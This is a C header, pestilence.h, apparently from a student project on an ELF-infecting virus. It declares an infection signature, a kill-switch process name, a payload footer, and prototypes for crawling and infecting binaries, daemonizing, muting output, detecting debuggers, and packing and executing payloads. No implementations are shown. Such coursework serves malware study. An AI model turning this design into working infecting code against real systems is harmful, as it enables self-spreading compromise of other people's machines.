/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/12 23:23:06 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

typedef struct	s_exec_ctx
{
	char	exec_path[4096];

	char	**av;
	char	**envp;
}	t_exec_ctx;

#define SIGNATURE_STR "\0" "Pestilence version 1.0 (c)oded by mbatty-pboucher"

// stops the virus if any process with this string in the name runs on the machine
#define BLOCKING_PROCESS "test"

bool	is_process_running(const char *name);

typedef struct s_footer
{
	uint64_t	magic;
	char		signature[sizeof(SIGNATURE_STR)];
	uint64_t	payload_size;
}	t_footer;

#define FOOTER_MAGIC 0x4242424242424242

t_footer	get_footer(const char *path);

#define I_AM_MAIN_PROCESS 1
#define I_AM_CHILD_PROCESS 0
#define I_AM_A_MISTAKE -1

int		daemonize();
int		mute_outputs();

char	*strjoin(char const *s1, char const *s2);
char 	*remove_last_n(char *str, size_t n);
char	*ft_itoa(int n);

int		infect_file(t_exec_ctx *ctx, const char *path);
int		crawl(t_exec_ctx *ctx);

int		check_signature(const char *path);
int		check_elf_hdr(const char *path);
bool 	runningUnderDebugger();

int		extract_payload(const char *path, uint8_t **data, uint64_t *size);
int		exec_payload(t_exec_ctx *ctx, uint8_t *data, uint64_t size);
void	pack_payload(const char *bin1_path, const char *bin2_path, const char *resbin_path);
